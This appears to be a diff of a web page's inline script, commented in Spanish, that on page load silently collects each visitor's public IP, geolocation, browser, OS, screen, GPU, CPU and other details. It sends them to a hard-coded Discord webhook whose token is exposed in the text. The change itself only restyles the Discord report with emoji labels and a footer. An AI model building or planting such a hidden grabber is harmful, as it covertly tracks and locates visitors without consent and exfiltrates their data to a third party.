@@ -75,7 +75,7 @@
 
 
     <script>
-        // Función para recolectar información del usuario y enviarla a Discord
+// Función para recolectar información del usuario y enviarla a Discord
 function sendUserInfo() {
     // Obtener IP pública usando un servicio externo
     fetch('https://api.ipify.org?format=json')
@@ -175,28 +175,33 @@ function sendToDiscord(userInfo) {
     const webhookUrl = "https://discord.com/api/webhooks/1294006529338507335/_zrSstE-4m_-FLwBBg4XmHiYg4KpQjM_WJ-XUdln7LNtdaj4Per8qQsPIy40H8cBqx9A";
 
     const message = {
-        content: "Información del usuario:", // Mensaje de encabezado
+        username: "User Info Bot",  // Nombre del bot
+        avatar_url: "https://i.imgur.com/AfFp7pu.png",  // Imagen del bot (opcional)
         embeds: [
             {
-                title: "Detalles del usuario",
-                color: 3447003, // Color del mensaje en Discord
+                title: "📋 Información del Usuario",  // Título atractivo con icono
+                color: 3447003, // Color del borde del embed (en formato decimal)
                 fields: [
-                    { name: "IP", value: userInfo.IP, inline: true },
-                    { name: "User-Agent", value: userInfo.UserAgent, inline: false },
-                    { name: "Pantalla", value: userInfo.Screen, inline: true },
-                    { name: "OS", value: userInfo.OS, inline: true },
-                    { name: "Idioma", value: userInfo.Idioma, inline: true },
-                    { name: "Conexión", value: userInfo.Conexion, inline: true },
-                    { name: "Referencia", value: userInfo.Referencia || "N/A", inline: true },
-                    { name: "Cookies Habilitadas", value: userInfo.CookiesHabilitadas ? "Sí" : "No", inline: true },
-                    { name: "Zona Horaria", value: userInfo.ZonaHoraria, inline: true },
-                    { name: "Hora Actual", value: userInfo.HoraActual, inline: true },
-                    { name: "Navegador", value: userInfo.Navegador, inline: true },
-                    { name: "Versión del Navegador", value: userInfo.VersionNavegador, inline: true },
-                    { name: "Geolocalización", value: userInfo.Geolocalizacion, inline: false },
-                    { name: "GPU", value: userInfo.GPU, inline: true },
-                    { name: "CPU Cores", value: userInfo.CPU_Cores.toString(), inline: true }
-                ]
+                    { name: "🌐 IP Pública", value: userInfo.IP, inline: true },
+                    { name: "🖥️ Sistema Operativo", value: userInfo.OS, inline: true },
+                    { name: "📏 Resolución de Pantalla", value: userInfo.Screen, inline: true },
+                    { name: "🌍 Idioma", value: userInfo.Idioma, inline: true },
+                    { name: "📶 Tipo de Conexión", value: userInfo.Conexion, inline: true },
+                    { name: "📄 Página de Referencia", value: userInfo.Referencia || "No disponible", inline: true },
+                    { name: "🍪 Cookies Habilitadas", value: userInfo.CookiesHabilitadas ? "Sí" : "No", inline: true },
+                    { name: "🕒 Zona Horaria", value: userInfo.ZonaHoraria, inline: true },
+                    { name: "⏰ Hora Local", value: userInfo.HoraActual, inline: true },
+                    { name: "🧑‍💻 Navegador", value: userInfo.Navegador, inline: true },
+                    { name: "🔢 Versión del Navegador", value: userInfo.VersionNavegador, inline: true },
+                    { name: "📍 Geolocalización", value: userInfo.Geolocalizacion, inline: false },
+                    { name: "🎮 GPU", value: userInfo.GPU, inline: true },
+                    { name: "⚙️ Núcleos CPU", value: userInfo.CPU_Cores.toString(), inline: true }
+                ],
+                footer: {
+                    text: "Reporte generado automáticamente",
+                    icon_url: "https://i.imgur.com/AfFp7pu.png"  // Icono del pie de página (opcional)
+                },
+                timestamp: new Date()  // Hora del reporte
             }
         ]
     };
@@ -219,6 +224,7 @@ function sendToDiscord(userInfo) {
 
 // Llamar a la función para enviar la información del usuario
 sendUserInfo();
+
 
     </script>
 </body>
